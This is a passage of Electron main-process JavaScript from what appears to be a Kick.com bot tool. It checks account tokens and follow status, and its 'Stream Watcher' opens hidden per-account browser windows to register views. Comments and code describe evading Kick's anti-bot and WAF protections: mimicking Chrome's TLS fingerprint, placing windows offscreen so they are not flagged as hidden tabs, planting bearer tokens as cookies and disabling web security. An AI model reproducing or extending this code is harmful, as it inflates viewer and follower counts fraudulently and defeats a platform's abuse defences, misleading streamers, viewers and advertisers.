  for (const [, p] of FBC_PENDING) {
    try { clearTimeout(p.timer); } catch (_) {}
    try { if (p.chromeProc) p.chromeProc.kill('SIGTERM'); } catch (_) {}
    if (p.reject) p.reject(new Error('Stopped by user'));
  }
  FBC_PENDING.clear();
  return { ok: true };
});


// ── Streams fetch ─────────────────────────────────────────────────────────────
// Fetches all slots streams from Kick in one shot — no pagination, no filtering
ipcMain.handle('streams-fetch', async (_e, _opts) => {
  const url = 'https://web.kick.com/api/v1/livestreams?limit=100&sort=viewer_count_desc&language=en&category_id=28';

  return await new Promise((resolve) => {
    let done = false;
    const finish = (val) => { if (done) return; done = true; resolve(val); };

    const win = new BrowserWindow({
      show: false,
      webPreferences: {
        contextIsolation: false,
        nodeIntegration: false,
        webSecurity: false,
        partition: 'persist:kick-streams',
      },
    });

    const timer = setTimeout(() => {
      try { win.destroy(); } catch (_) {}
      finish({ ok: false, error: 'timeout' });
    }, 12000);

    win.webContents.on('did-finish-load', async () => {
      try {
        const raw = await win.webContents.executeJavaScript('document.body.innerText');
        clearTimeout(timer);
        try { win.destroy(); } catch (_) {}
        const data = JSON.parse(raw);
        let list = [];
        try { list = data.data.livestreams; } catch(_) {}
        if (!Array.isArray(list)) list = [];
        finish({ ok: true, data: list });
      } catch (e) {
        clearTimeout(timer);
        try { win.destroy(); } catch (_) {}
        finish({ ok: false, error: e.message });
      }
    });

    win.webContents.on('did-fail-load', (_e, code, desc) => {
      clearTimeout(timer);
      try { win.destroy(); } catch (_) {}
      finish({ ok: false, error: desc + ' (' + code + ')' });
    });

    win.loadURL(url, {
      userAgent: CHROME_UA,
      extraHeaders: 'Accept: application/json\nReferer: https://kick.com/category/slots\n',
    });
  });
});

// ── File-based data store ─────────────────────────────────────────────────────
const STORE_FILE = path.join(app.getPath('userData'), 'flt-data.json');

ipcMain.handle('store-load', () => {
  try {
    if (!fs.existsSync(STORE_FILE)) return null;
    return JSON.parse(fs.readFileSync(STORE_FILE, 'utf8'));
  } catch (e) {
    console.warn('[Store] load error:', e.message);
    return null;
  }
});

ipcMain.handle('store-save', (_e, data) => {
  try {
    // Merge with whatever is already on disk so a partial save (e.g. Kick-only
    // keys) doesn't wipe out other namespaces (e.g. Discord — flt_dc_*).
    let existing = {};
    try {
      if (fs.existsSync(STORE_FILE)) {
        const raw = fs.readFileSync(STORE_FILE, 'utf8');
        const parsed = JSON.parse(raw);
        if (parsed && typeof parsed === 'object' && !Array.isArray(parsed)) existing = parsed;
      }
    } catch (_) { /* corrupt file → start fresh */ }
    const merged = Object.assign({}, existing, data || {});
    fs.writeFileSync(STORE_FILE, JSON.stringify(merged), 'utf8');
    return { ok: true };
  } catch (e) {
    console.warn('[Store] save error:', e.message);
    return { ok: false, error: e.message };
  }
});

ipcMain.handle('store-clear', () => {
  try {
    if (fs.existsSync(STORE_FILE)) fs.unlinkSync(STORE_FILE);
    return { ok: true };
  } catch (e) {
    console.warn('[Store] clear error:', e.message);
    return { ok: false, error: e.message };
  }
});


// ── Window controls ──────────────────────────────────────────────────────────
ipcMain.on('win-minimize',    ()      => { try { mainWin?.minimize(); } catch (_) {} });
ipcMain.on('win-maximize',    ()      => { try { mainWin?.isMaximized() ? mainWin.unmaximize() : mainWin?.maximize(); } catch (_) {} });
ipcMain.on('win-close',       ()      => { try { mainWin?.close(); } catch (_) {} });
ipcMain.on('win-toggle-top',  (e, v)  => { try { mainWin?.setAlwaysOnTop(v, v ? 'screen-saver' : 'normal'); } catch (_) {} e.returnValue = v; });
ipcMain.on('win-set-opacity', (_e, v) => { try { mainWin?.setOpacity(Math.max(0.2, Math.min(1, v))); } catch (_) {} });

// ── License IPC handlers ──────────────────────────────────────────────────────

// Validate stored key (called by license gate on load)
// ── Viewer Token — fetched in main process so account session cookies travel ──
// The renderer can't fetch this authenticated because it doesn't hold Kick cookies.
// We create a temporary session, inject the account's session_token cookie,
// then fetch the viewer token — Kick ties the token to that authenticated user.
// ── Helper: authenticated GET against kick.com using Electron's Chromium
//    networking stack. Kick's WAF blocks raw Node TLS (different JA3), so we
//    go through net.request which uses Chrome's actual TLS fingerprint. The
//    bearer token is injected as both session_token + kick_session cookies
//    (matches what real browsers send) AND as an Authorization header.
async function kickAuthGet(token, url) {
  const clean = String(token || '').trim().replace(/^Bearer\s+/i, '');
  if (!clean) return { ok: false, status: 0, error: 'no-token' };

  // Reuse a partition keyed by a hash of the token — so repeated checks for
  // the same account reuse Chromium's connection pool + cookies.
  const partKey   = require('crypto').createHash('md5').update(clean.slice(0, 32)).digest('hex').slice(0, 12);
  const partition = 'persist:kc-' + partKey;
  const ses       = session.fromPartition(partition);
  try { ses.setUserAgent(CHROME_UA); } catch (_) {}

  // Plant auth cookies (must be set BEFORE the request fires)
  const expiry = Math.floor(Date.now() / 1000) + 86400 * 7;
  for (const name of ['session_token', 'kick_session', 'XSRF-TOKEN']) {
    try {
      await ses.cookies.set({
        url: 'https://kick.com', domain: '.kick.com', path: '/',
        secure: true, httpOnly: false, expirationDate: expiry,
        sameSite: 'no_restriction',
        name, value: clean,
      });
    } catch (_) {}
  }

  return await new Promise((resolve) => {
    const req = net.request({
      method:  'GET',
      url,
      session: ses,
      useSessionCookies: true,
      redirect: 'follow',
    });
    req.setHeader('Accept',          'application/json');
    req.setHeader('Accept-Language', 'en-US,en;q=0.9');
    req.setHeader('Origin',          'https://kick.com');
    req.setHeader('Referer',         'https://kick.com/');
    req.setHeader('User-Agent',      CHROME_UA);
    req.setHeader('X-App-Platform',  'web');
    req.setHeader('Authorization',   'Bearer ' + clean);

    let body = '';
    const timer = setTimeout(() => { try { req.abort(); } catch (_) {} resolve({ ok: false, status: 0, error: 'timeout' }); }, 10000);
    req.on('response', (res) => {
      res.on('data', (chunk) => { body += chunk.toString('utf8'); });
      res.on('end', () => {
        clearTimeout(timer);
        resolve({ ok: true, status: res.statusCode, body });
      });
    });
    req.on('error', (e) => {
      clearTimeout(timer);
      resolve({ ok: false, status: 0, error: String(e && e.message || e) });
    });
    req.end();
  });
}

// ── Token Health Check ───────────────────────────────────────────────────
// Pings /api/v1/user with the given bearer token. Returns:
//   { ok: true, valid: true,  status: 200, username, uid, email }
//   { ok: true, valid: false, status: 401|403|...,  reason }
//   { ok: false, error: 'network/parse error' }
ipcMain.handle('kick-token-check', async (_e, { token }) => {
  try {
    const clean = String(token || '').trim().replace(/^Bearer\s+/i, '');
    if (!clean) return { ok: true, valid: false, status: 0, reason: 'no-token' };
    const res = await kickAuthGet(clean, 'https://kick.com/api/v1/user');
    if (!res.ok) return { ok: false, error: res.error || 'request-failed', status: res.status || 0 };
    if (res.status === 200) {
      let j = null;
      try { j = JSON.parse(res.body); } catch (_) {}
      if (j && j.username) {
        return {
          ok:       true,
          valid:    true,
          status:   200,
          username: j.username || null,
          uid:      j.id || j.user_id || null,
          email:    j.email || null,
          avatar:   (j.profile_pic) || (j.profile_picture && j.profile_picture.url) || null,
        };
      }
      // 200 but no username — could be cloudflare challenge or empty body
      return { ok: true, valid: false, status: 200, reason: 'parse-empty', body_head: (res.body || '').slice(0, 100) };
    }
    return { ok: true, valid: false, status: res.status, reason: 'http-' + res.status };
  } catch (e) {
    return { ok: false, error: String(e && e.message || e) };
  }
});

// ── In-browser follow check ─────────────────────────────────────────────
//  Uses a hidden BrowserWindow to load kick.com as the authenticated user,
//  then calls /api/v2/channels/followed from INSIDE the page context. This
//  is the same context the Follow Bot extension uses successfully — Kick's
//  anti-bot accepts it because the request originates from a real Kick.com
//  page with all the browser state Kick expects (cookies, session, JS
//  challenges all resolved). The main-process net.request path can't
//  reproduce all that, which is why direct API calls were returning empty.
ipcMain.handle('kick-follow-check-browser', async (_e, { token, slug }) => {
  let win = null;
  try {
    const clean = String(token || '').trim().replace(/^Bearer\s+/i, '');
    if (!clean) return { ok: false, error: 'no-token' };
    if (!slug)  return { ok: false, error: 'no-slug' };
    const slugLower = String(slug).toLowerCase();

    // Isolated session per token-hash so cookies don't bleed between accounts.
    const partKey   = require('crypto').createHash('md5').update(clean.slice(0, 32)).digest('hex').slice(0, 12);
    const partition = 'persist:fc-' + partKey;
    const ses       = session.fromPartition(partition);
    try { ses.setUserAgent(CHROME_UA); } catch (_) {}

    // Plant auth cookies BEFORE the page loads
    const expiry = Math.floor(Date.now() / 1000) + 86400 * 7;
    for (const name of ['session_token', 'kick_session', 'auth_token', 'access_token', 'XSRF-TOKEN']) {
      try {
        await ses.cookies.set({
          url: 'https://kick.com', domain: '.kick.com', path: '/',
          secure: true, httpOnly: false, expirationDate: expiry,
          sameSite: 'no_restriction',
          name, value: clean,
        });
      } catch (_) {}
    }
    // Inject Bearer header on every API request — covers endpoints that
    // also check Authorization
    try {
      ses.webRequest.onBeforeSendHeaders(
        { urls: ['https://kick.com/*', 'https://*.kick.com/*'] },
        (details, cb) => {
          const h = Object.assign({}, details.requestHeaders);
          h['Authorization'] = 'Bearer ' + clean;
          if (details.url.includes('/api/')) h['Accept'] = 'application/json';
          cb({ requestHeaders: h });
        }
      );
    } catch (_) {}

    // Hidden, offscreen, real Chromium (passes Kasada/WAF same as the
    // Stream Watcher windows do).
    win = new BrowserWindow({
      width: 800, height: 600,
      show: false,
      skipTaskbar: true,
      webPreferences: {
        partition,
        contextIsolation: false,
        nodeIntegration:  false,
        webSecurity:      false,
        backgroundThrottling: false,
        devTools:         IS_DEV,
      },
    });

    // Block heavy assets — we just need the API call to succeed
    try {
      ses.webRequest.onBeforeRequest(
        { urls: ['*://*/*.m3u8', '*://*/*.ts', '*://*/*.mp4', '*://*/*.png', '*://*/*.jpg', '*://*/*.webp', '*://*/*.woff*'] },
        (_d, cb) => cb({ cancel: true })
      );
    } catch (_) {}

    // Load kick.com/following/channels — the page that LISTS all channels the
    // account follows. Once it renders, we (1) scrape the channel slugs from
    // the DOM, AND (2) call /api/v2/channels/followed from inside the page
    // (now properly authenticated because Kick's frontend has done all its
    // session-bootstrap on this auth-gated page). Whichever gives us the
    // full list wins.
    const result = await new Promise((resolve) => {
      const timer = setTimeout(() => resolve({ ok: false, error: 'timeout' }), 30000);

      win.webContents.once('did-finish-load', async () => {
        // Give the SPA 2.5s to hydrate the followed-channels grid
        setTimeout(async () => {
          try {
            const js =
              '(async function(){' +
                // Wait up to 8s for the channel grid to appear in the DOM
                'const sleep=ms=>new Promise(r=>setTimeout(r,ms));' +
                'const t0=Date.now();' +
                'let domSlugs=[];' +
                'while(Date.now()-t0<8000){' +
                  // Scrape every anchor pointing to /<channelSlug> — they are
                  // the per-channel cards on the followed-channels page. Skip
                  // sidebar/nav links that go to known non-channel routes.
                  'const exclude=new Set(["browse","categories","following","login","signup","settings","subscriptions","help","tos","privacy","contact","press","careers","brand","jobs","streamer","creator","wallet","store","kick-store","verification","leaderboard","docs","blog","creators","apps","plus","clips","developer","analytics","studio","dashboard","home","explore","gifting","faq","gambling","kickbot","viewer","feedback","careers","communityguidelines","terms","privacypolicy","cookies","language","logout"]);' +
                  'const links=Array.from(document.querySelectorAll(\'a[href^="/"]\'));' +
                  'const found=new Set();' +
                  'for(const a of links){' +
                    'const href=a.getAttribute("href")||"";' +
                    'const m=href.match(/^\\/([A-Za-z0-9_-]{2,30})\\/?(?:\\?|#|$)/);' +
                    'if(!m) continue;' +
                    'const slug=m[1].toLowerCase();' +
                    'if(exclude.has(slug)) continue;' +
                    'if(slug.startsWith("category")||slug.startsWith("clip")) continue;' +
                    'found.add(slug);' +
                  '}' +
                  'domSlugs=Array.from(found);' +
                  'if(domSlugs.length>0) break;' +
                  'await sleep(400);' +
                '}' +
                // Also try the API from this authenticated page context — paginated
                'let apiSlugs=[];' +
                'let apiError=null;' +
                'try{' +
                  'for(let p=1;p<=10;p++){' +
                    'const r=await fetch("/api/v2/channels/followed"+(p>1?("?page="+p):""),{' +
                      'credentials:"include",headers:{accept:"application/json","x-app-platform":"web"}});' +
                    'if(!r.ok){apiError="http-"+r.status;break;}' +
                    'const j=await r.json();' +
                    'const arr=Array.isArray(j)?j:Array.isArray(j.data)?j.data:Array.isArray(j.channels)?j.channels:Array.isArray(j.followed)?j.followed:Array.isArray(j.results)?j.results:[];' +
                    'if(!arr.length) break;' +
                    'for(const it of arr){' +
                      'const c=it&&(it.slug||it.username||it.name||(it.channel&&(it.channel.slug||it.channel.username))||(it.user&&(it.user.username||it.user.slug)));' +
                      'if(typeof c==="string"&&c) apiSlugs.push(c.toLowerCase());' +
                    '}' +
                    'if(arr.length<10) break;' +
                  '}' +
                '}catch(e){apiError=String(e&&e.message||e);}' +
                // Merge both sources (some accounts may have only one work)
                'const all=new Set();' +
                'domSlugs.forEach(s=>all.add(s));' +
                'apiSlugs.forEach(s=>all.add(s));' +
                'return {ok:true,count:all.size,slugs:Array.from(all),dom_count:domSlugs.length,api_count:apiSlugs.length,api_error:apiError,url:location.href};' +
              '})()';
            const r = await win.webContents.executeJavaScript(js);
            clearTimeout(timer);
            resolve(r || { ok: false, error: 'no-result' });
          } catch (e) {
            clearTimeout(timer);
            resolve({ ok: false, error: String(e && e.message || e) });
          }
        }, 2500);
      });

      win.webContents.once('did-fail-load', (_e2, code, desc) => {
        clearTimeout(timer);
        resolve({ ok: false, error: 'load-fail-' + code + ': ' + desc });
      });

      // ⭐ Load the FOLLOWED CHANNELS page directly — auth-gated, so Kick's
      //   frontend runs its full session bootstrap before the page renders.
      win.loadURL('https://kick.com/following/channels').catch((e) => {
        clearTimeout(timer);
        resolve({ ok: false, error: 'loadURL: ' + (e.message || e) });
      });
    });

    // Cleanup
    try { if (win && !win.isDestroyed()) win.destroy(); } catch (_) {}
    try { ses.clearStorageData({ storages: ['cookies', 'localstorage', 'serviceworkers', 'cachestorage'] }); } catch (_) {}

    if (!result || !result.ok) return result || { ok: false, error: 'unknown' };
    const follows = Array.isArray(result.slugs) && result.slugs.indexOf(slugLower) !== -1;
    return {
      ok:           true,
      following:    follows,
      count:        result.count || 0,
      slugs_sample: (result.slugs || []).slice(0, 8),
      dom_count:    result.dom_count,
      api_count:    result.api_count,
      api_error:    result.api_error,
      page_url:     result.url,
    };
  } catch (e) {
    try { if (win && !win.isDestroyed()) win.destroy(); } catch (_) {}
    return { ok: false, error: String(e && e.message || e) };
  }
});

// ── Per-channel follow check — way more reliable than the followed-list ─
// Fetches /api/v2/channels/<slug> authenticated as the account, then looks
// for a follow-state flag in the response. Kick has changed where this
// flag lives several times; we look in every known location, including the
// authenticated-only "current_user_relationship" wrapper. Returns:
//   { ok: true, following: true|false, body_head?, indicator? }
//   { ok: false, error: '...', body_head? }
ipcMain.handle('kick-check-channel-follow', async (_e, { token, slug }) => {
  try {
    const clean = String(token || '').trim().replace(/^Bearer\s+/i, '');
    if (!clean) return { ok: false, error: 'no-token' };
    if (!slug)  return { ok: false, error: 'no-slug' };
    const url  = 'https://kick.com/api/v2/channels/' + encodeURIComponent(slug);
    const res  = await kickAuthGet(clean, url);
    if (!res.ok) return { ok: false, error: res.error || 'request-failed', status: res.status || 0 };
    if (res.status === 401 || res.status === 403)
      return { ok: false, error: 'auth-' + res.status, status: res.status };
    if (res.status === 404)
      return { ok: false, error: 'channel-not-found', status: 404 };
    if (res.status !== 200)
      return { ok: false, error: 'http-' + res.status, status: res.status, body_head: (res.body || '').slice(0, 200) };

    let j = null;
    try { j = JSON.parse(res.body); }
    catch (_) {
      return { ok: false, error: 'parse', body_head: (res.body || '').slice(0, 200) };
    }

    // STRICT boolean-only probes. We do NOT infer follow state from the
    // mere presence of objects (the response has many unrelated objects like
    // root.user, root.chatroom, etc. — using their presence as "following"
    // gave false positives). Only an explicit boolean wins.
    const probes = [
      ['root.is_followed',                                  v => v?.is_followed],
      ['root.followed',                                     v => v?.followed],
      ['root.following',                                    v => v?.following],
      ['root.is_following',                                 v => v?.is_following],
      ['root.current_user_relationship.following',          v => v?.current_user_relationship?.following],
      ['root.current_user_relationship.is_following',       v => v?.current_user_relationship?.is_following],
      ['root.current_user_relationship.is_followed',        v => v?.current_user_relationship?.is_followed],
      ['root.user.is_followed',                             v => v?.user?.is_followed],
      ['root.user.following',                               v => v?.user?.following],
      ['root.user_relationship.following',                  v => v?.user_relationship?.following],
      ['root.relationship.following',                       v => v?.relationship?.following],
      ['root.viewer.is_following',                          v => v?.viewer?.is_following],
      ['root.me.is_following',                              v => v?.me?.is_following],
    ];
    let indicator = null;
    let following = null;
    for (const [name, fn] of probes) {
      const got = fn(j);
      if (typeof got === 'boolean') { indicator = name; following = got; break; }
    }

    // Special case for `current_user_follow`: Kick sometimes returns this
    // as an OBJECT with { id, created_at, ... } iff you follow, and `null`
    // iff you don't. Only use this when we have BOTH cases observed (i.e.,
    // explicitly null OR explicitly object) — never inferred from presence.
    if (indicator === null && Object.prototype.hasOwnProperty.call(j, 'current_user_follow')) {
      const cuf = j.current_user_follow;
      if (cuf === null) { indicator = 'root.current_user_follow:null';   following = false; }
      else if (typeof cuf === 'object' && (typeof cuf.created_at === 'string' || typeof cuf.followed_at === 'string')) {
        indicator = 'root.current_user_follow:obj'; following = true;
      }
    }

    // Always return body_head for the first request so the renderer can dump
    // it to DevTools. This is critical for debugging — without seeing the
    // actual response we can't know if our probes are correct.
    return {
      ok:        true,
      following,                                // boolean or null
      indicator: indicator || 'none-found',
      body_head: (res.body || '').slice(0, 1200),
      channel_id: j?.id,
      channel_user: j?.user?.username || j?.slug || null,
    };
  } catch (e) {
    return { ok: false, error: String(e && e.message || e) };
  }
});

// ── Followed-list Check ──────────────────────────────────────────────────
// Walks pagination — Kick returns the followed list in pages of ~24 by
// default. We follow ?cursor= or ?page= until empty, OR if the user is
// specifically checking against a target channel we short-circuit as soon
// as that channel appears in the list (fast path).
ipcMain.handle('kick-followed-list', async (_e, { token, target }) => {
  try {
    const clean = String(token || '').trim().replace(/^Bearer\s+/i, '');
    if (!clean) return { ok: false, error: 'no-token' };
    const targetLower = target ? String(target).toLowerCase() : null;

    function extractSlugs(j) {
      // The followed endpoint has changed shape a few times — handle every
      // known variant: top-level array, .data, .channels, .followed, nested
      // {data:{channels:[]}}, hydra:member, etc.
      let list =
        Array.isArray(j)                                  ? j :
        Array.isArray(j && j.data)                        ? j.data :
        Array.isArray(j && j.channels)                    ? j.channels :
        Array.isArray(j && j.followed)                    ? j.followed :
        Array.isArray(j && j['hydra:member'])             ? j['hydra:member'] :
        Array.isArray(j && j.data && j.data.channels)     ? j.data.channels :
        Array.isArray(j && j.data && j.data.followed)     ? j.data.followed :
        Array.isArray(j && j.data && j.data.data)         ? j.data.data :
        Array.isArray(j && j.results)                     ? j.results :
        [];
      const out = [];
      for (const item of list) {
        if (!item) continue;
        // Dig in every channel-shaped place. Kick has wrapped this in many
        // different shells over time.
        const candidates = [
          item.slug, item.username, item.name,
          item.channel && item.channel.slug,
          item.channel && item.channel.username,
          item.channel && item.channel.name,
          item.user    && item.user.username,
          item.user    && item.user.slug,
          item.user    && item.user.name,
          item.streamer && item.streamer.username,
          item.streamer && item.streamer.slug,
          // Sometimes the top-level "slug" is the chatroom or category — also
          // look one level deeper for any string-valued .username field.
          item.channel_user && item.channel_user.username,
        ];
        for (const c of candidates) {
          if (typeof c === 'string' && c) { out.push(c.toLowerCase()); break; }
        }
      }
      return out;
    }
    function nextCursor(j) {
      if (!j || typeof j !== 'object') return null;
      // Multiple cursor shapes in the wild
      if (typeof j.next_cursor === 'string' && j.next_cursor) return { kind: 'cursor', value: j.next_cursor };
      if (typeof j.cursor      === 'string' && j.cursor)      return { kind: 'cursor', value: j.cursor };
      if (j.meta && typeof j.meta.next_cursor === 'string' && j.meta.next_cursor) return { kind: 'cursor', value: j.meta.next_cursor };
      if (j.links && typeof j.links.next === 'string' && j.links.next) {
        // links.next is a full URL; extract its ?cursor= or ?page= if present
        const u = j.links.next;
        const m = u.match(/[?&]cursor=([^&]+)/); if (m) return { kind: 'cursor', value: decodeURIComponent(m[1]) };
        const p = u.match(/[?&]page=(\d+)/);     if (p) return { kind: 'page',   value: parseInt(p[1], 10) };
      }
      return null;
    }

    let allSlugs = [];
    let firstBodyHead = '';
    let cur = null;       // { kind: 'cursor'|'page', value }
    let pageNum = 1;
    const MAX_PAGES = 25; // hard cap to avoid runaway

    for (let p = 0; p < MAX_PAGES; p++) {
      let url = 'https://kick.com/api/v2/channels/followed';
      if (cur) {
        url += (url.includes('?') ? '&' : '?') +
          (cur.kind === 'cursor' ? 'cursor=' + encodeURIComponent(cur.value) : 'page=' + cur.value);
      } else if (p > 0) {
        url += '?page=' + pageNum;
      }
      const res = await kickAuthGet(clean, url);
      if (!res.ok) return { ok: false, error: res.error || 'request-failed', status: res.status || 0, body_head: firstBodyHead };
      if (res.status === 401 || res.status === 403) {
        return { ok: false, error: 'http-' + res.status, status: res.status, body_head: (res.body || '').slice(0, 200) };
      }
      if (res.status !== 200) {
        return { ok: false, error: 'http-' + res.status, status: res.status, body_head: (res.body || '').slice(0, 200) };
      }
      let j = null;
      try { j = JSON.parse(res.body); }
      catch (_) {
        return { ok: false, error: 'parse', body_head: (res.body || '').slice(0, 200) };
      }
      if (p === 0) firstBodyHead = (res.body || '').slice(0, 400);
      const pageSlugs = extractSlugs(j);
      allSlugs = allSlugs.concat(pageSlugs);
      // Fast-path: if caller passed a target and we already saw it, stop
      if (targetLower && pageSlugs.indexOf(targetLower) !== -1) break;
      // Advance to the next page
      const next = nextCursor(j);
      if (next) {
        cur = next;
        if (next.kind === 'page') pageNum = next.value;
      } else if (pageSlugs.length === 0) {
        break;  // empty page → done
      } else {
        // No explicit cursor field, but the page wasn't empty — try numeric
        // page param. If page 2 returns empty, we'll stop next iteration.
        pageNum += 1;
        cur = { kind: 'page', value: pageNum };
        if (pageSlugs.length < 5) break;  // unlikely there's more after a tiny page
      }
    }
    return {
      ok:       true,
      status:   200,
      count:    allSlugs.length,
      slugs:    allSlugs,
      body_head: firstBodyHead,     // surfaced for debugging — renderer can log
    };
  } catch (e) {
    return { ok: false, error: String(e && e.message || e) };
  }
});

ipcMain.handle('viewer-token', async (_e, { bearerToken }) => {
  try {
    const clean    = (bearerToken || '').replace(/^Bearer\s*/i, '').trim();
    const CLIENT_TOKEN = 'e1393935a959b4020a4491574f6490129f678acdaa92760471263db43487f823';
    const partition    = 'persist:vt-' + require('crypto').createHash('md5').update(clean.slice(0, 16)).digest('hex');
    const ses          = session.fromPartition(partition);

    // Inject the bearer token as Kick session cookies
    if (clean) {
      const expiry = Math.floor(Date.now() / 1000) + 86400 * 7;
      for (const name of ['session_token', 'kick_session', 'auth_token', 'access_token']) {
        await ses.cookies.set({
          url: 'https://kick.com', domain: '.kick.com', path: '/',
          secure: true, httpOnly: false, expires: expiry,
          name, value: clean,
        }).catch(() => {});
      }
    }

    const token = await new Promise((resolve, reject) => {
      const req = net.request({
        method:  'GET',
        url:     'https://websockets.kick.com/viewer/v1/token',
        session: ses,
        useSessionCookies: true,
      });
      req.setHeader('Accept',          'application/json');
      req.setHeader('Accept-Language', 'en-US,en;q=0.9');
      req.setHeader('Origin',          'https://kick.com');
      req.setHeader('Referer',         'https://kick.com/');
      req.setHeader('X-CLIENT-TOKEN',  CLIENT_TOKEN);
      req.setHeader('User-Agent',      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
      if (clean) req.setHeader('Authorization', 'Bearer ' + clean);

      let body = '';
      req.on('response', (res) => {
        res.on('data',  (d) => { body += d.toString(); });
        res.on('end',   () => {
          try {
            const data = JSON.parse(body);
            const t    = data?.data?.token || data?.token;
            if (t) resolve(t); else reject(new Error('No token in response: ' + body.slice(0, 100)));
          } catch(e) { reject(new Error('Parse error: ' + e.message)); }
        });
      });
      req.on('error', (e) => reject(e));
      const timer = setTimeout(() => { try { req.abort(); } catch(_) {} reject(new Error('Timeout')); }, 15000);
      req.on('response', () => clearTimeout(timer));
      req.end();
    });

    return { ok: true, token };
  } catch(e) {
    console.warn('[viewer-token]', e.message);
    return { ok: false, error: e.message };
  }
});

/* ═══════════════════════════════════════════════════════════════════════════
   VIEWER WEBSOCKET — main process (native TLS)
   ═══════════════════════════════════════════════════════════════════════════
   WHY: Browser WebSocket() cannot set custom headers. The renderer sends the
   WS upgrade with Origin: null (Electron context), which Kick's server
   immediately rejects with code 1006.
   FIX: Raw TLS socket in main.js injects the correct headers:
     Origin: https://kick.com
     User-Agent: <Chrome UA>
   This is identical to what a real browser sends.
   ═══════════════════════════════════════════════════════════════════════════ */

const tls    = require('tls');
const _vwMap = new Map(); // accountId → { socket, pingTimer, alive }

const VW_HOST    = 'websockets.kick.com';
const VW_PORT    = 443;
const VW_PATH    = '/viewer/v1/connect';
const VW_PING_MIN = 12000;
const VW_PING_MAX = 17000;

function vwLog(win, accountId, username, msg, type) {
  if (win && !win.isDestroyed())
    win.webContents.send('vw-log', { accountId, username, msg, type: type || 'dim' });
}

function vwStatus(win, accountId, status, extra) {
  if (win && !win.isDestroyed())
    win.webContents.send('vw-status', { accountId, status, ...extra });
}

function vwClose(accountId) {
  const entry = _vwMap.get(accountId);
  if (!entry) return;
  clearTimeout(entry.pingTimer);
  if (entry.socket) try { entry.socket.destroy(); } catch (_) {}
  if (entry.bw && !entry.bw.isDestroyed()) try { entry.bw.destroy(); } catch (_) {}
  _vwMap.delete(accountId);
}

function vwCloseAll() {
  for (const id of _vwMap.keys()) vwClose(id);
}

// ── Stream Watcher — Electron BrowserWindow approach ────────────────────────
//  Why: Kick's /viewer/v1/connect WebSocket protocol rejects every raw-TLS
//  client we tried with "Invalid message received". Their viewer counter is
//  evidently triggered by a real browser session loading the channel page —
//  Kick handles all the WS/HTTP heartbeats internally. We just need to BE
//  a real browser. Electron's Chromium provides exactly that, with the same
//  TLS fingerprint as Chrome and full cookie + JS engine support.
function vwOpenBrowserWindow(parentWin, { accountId, username, bearerToken, channelSlug }) {
  vwClose(accountId);
  const clean = String(bearerToken || '').trim().replace(/^Bearer\s+/i, '');
  if (!clean) {
    vwLog(parentWin, accountId, username, 'no bearer token — skipping', 'err');
    vwStatus(parentWin, accountId, 'error', { error: 'no token' });
    return;
  }
  if (!channelSlug) {
    vwLog(parentWin, accountId, username, 'no channel slug — skipping', 'err');
    vwStatus(parentWin, accountId, 'error', { error: 'no channel' });
    return;
  }

  // Isolated session per account so cookies don't bleed across viewers.
  const partition = 'persist:vw-bw-' + accountId;
  const ses = session.fromPartition(partition);
  try { ses.setUserAgent(VW_BROWSER_UA); } catch (_) {}

  // Plant Kick auth cookies so the page loads as the logged-in account.
  const exp = Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 7;
  const cookieNames = ['session_token', 'kick_session', 'auth_token', 'access_token', 'XSRF-TOKEN'];
  (async () => {
    for (const name of cookieNames) {
      try {
        await ses.cookies.set({
          url: 'https://kick.com', domain: '.kick.com', path: '/',
          secure: true, httpOnly: false, expirationDate: exp,
          sameSite: 'no_restriction',
          name, value: clean,
        });
      } catch (_) {}
    }
  })();

  // Inject Bearer header on every kick.com request — belt + suspenders for
  // the API endpoints the page calls during boot.
  try {
    ses.webRequest.onBeforeSendHeaders(
      { urls: ['https://kick.com/*', 'https://*.kick.com/*'] },
      (details, cb) => {
        const h = Object.assign({}, details.requestHeaders);
        h['Authorization'] = 'Bearer ' + clean;
        if (details.url.includes('/api/')) h['Accept'] = 'application/json';
        cb({ requestHeaders: h });
      }
    );
  } catch (_) {}

  // ── Aggressive resource blocking ────────────────────────────────────────
  // Kick's viewer counter triggers from the player JS booting + HLS manifest
  // loading. We KEEP .m3u8/.ts (needed for viewer count) but block every
  // other non-essential resource: images, fonts, stylesheets for ads/3p,
  // analytics, tracking pixels. Cuts per-account RAM by ~50% with no impact
  // on viewer registration.
  try {
    ses.webRequest.onBeforeRequest(
      { urls: ['<all_urls>'] },
      (details, cb) => {
        const u = details.url;
        const rt = details.resourceType;
        // Never block: HTML doc, scripts, XHR/fetch (player + viewer API),
        // websocket upgrades, the .m3u8 manifest, and .ts segments
        if (rt === 'mainFrame' || rt === 'subFrame' || rt === 'script' ||
            rt === 'xhr' || rt === 'webSocket' || rt === 'other') {
          // .ts and .m3u8 fall under 'other'/'xhr' depending on Chrome
          return cb({});
        }
        // Block images everywhere (avatars, thumbnails, emote sprites…)
        if (rt === 'image') return cb({ cancel: true });
        // Block fonts (we never render text the user sees)
        if (rt === 'font')  return cb({ cancel: true });
        // Block media segments we don't need — but keep .m3u8 (the manifest)
        if (rt === 'media') {
          if (/\.m3u8(\?|$)/i.test(u)) return cb({});      // keep manifests
          return cb({ cancel: true });                       // skip .mp4/.aac/.webm
        }
        // Block stylesheets — page won't be visually styled but JS runs fine
        if (rt === 'stylesheet') return cb({ cancel: true });
        // Block tracking / analytics / ads
        if (/google-analytics|googletagmanager|hotjar|segment|amplitude|mixpanel|sentry|datadog|fullstory|cloudflareinsights|doubleclick|ads\b/i.test(u)) {
          return cb({ cancel: true });
        }
        cb({});
      }
    );
  } catch (_) {}

  const bw = new BrowserWindow({
    // Smaller window = less to composite. 320x240 is barely above the min
    // viewport size that some sites still render properly.
    width: 320, height: 240,
    // ⭐ Visible to the OS, but positioned far offscreen so the user never
    //    sees the windows. `show: false` made Kick treat us as hidden tabs
    //    and silently drop the viewer count. With show:true + offscreen we
    //    look identical to a real foreground browser tab.
    show: true,
    x: -32000, y: -32000,
    skipTaskbar: true,                    // don't clutter the taskbar
    minimizable: false,
    resizable: false,
    movable: false,
    icon: APP_ICON,
    title: 'Stream Watcher — ' + (username || '?'),
    paintWhenInitiallyHidden: false,      // skip painting until shown (never)
    webPreferences: {
      partition,
      contextIsolation: false,
      nodeIntegration:  false,
      webSecurity:      false,
      backgroundThrottling: false,        // hidden tabs would normally throttle
      autoplayPolicy:   'no-user-gesture-required',
      spellcheck:       false,            // disable spellchecker workers
